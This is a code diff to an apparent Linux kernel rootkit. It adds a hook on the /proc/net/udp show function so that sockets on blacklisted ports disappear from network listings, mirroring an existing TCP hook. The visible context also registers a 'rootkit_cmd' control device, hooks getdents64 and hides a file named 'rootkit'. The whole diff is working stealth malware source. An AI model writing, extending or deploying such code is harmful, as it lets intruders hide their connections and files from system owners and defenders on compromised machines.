@@ -137,6 +137,25 @@ RET:
         "tcp4_seq_show", int (*)(struct seq_file *, void *), int, seq, v);
 }
 
+static int udp4_seq_show_evil(struct seq_file *seq, void *v)
+{
+    if (v == SEQ_START_TOKEN)
+        goto RET;
+    struct inet_sock *sk = (struct inet_sock *) v;
+    struct struct_list *node;
+    read_lock(&port_black_list_lock);
+    list_for_each_entry (node, &port_black_list, list)
+        if (htons(node->num) == sk->inet_sport ||
+            htons(node->num) == sk->inet_dport) {
+            read_unlock(&port_black_list_lock);
+            return 0;
+        }
+    read_unlock(&port_black_list_lock);
+RET:
+    return CALL_ORIGINAL_FUNC_BY_NAME_RET(
+        "udp4_seq_show", int (*)(struct seq_file *, void *), int, seq, v);
+}
+
 void hide_port(unsigned int port)
 {
     struct struct_list *node =
@@ -168,10 +187,15 @@ void utils_init()
     chrdev_add("rootkit_cmd", &fops);
     hook_start(get_syscall(__NR_getdents64), (unsigned long) getdents64_evil,
                "sys_getdents64");
-    struct seq_operations *tcp_ops = proc_get_seq_ops_by_path("/proc/net/tcp");
-    if (tcp_ops) {
-        hook_start((unsigned long) tcp_ops->show,
+    struct seq_operations *ops = proc_get_seq_ops_by_path("/proc/net/tcp");
+    if (ops) {
+        hook_start((unsigned long) ops->show,
                    (unsigned long) tcp4_seq_show_evil, "tcp4_seq_show");
+    }
+    ops = proc_get_seq_ops_by_path("/proc/net/udp");
+    if (ops) {
+        hook_start((unsigned long) ops->show,
+                   (unsigned long) udp4_seq_show_evil, "udp4_seq_show");
     }
 
     hide_file("rootkit");
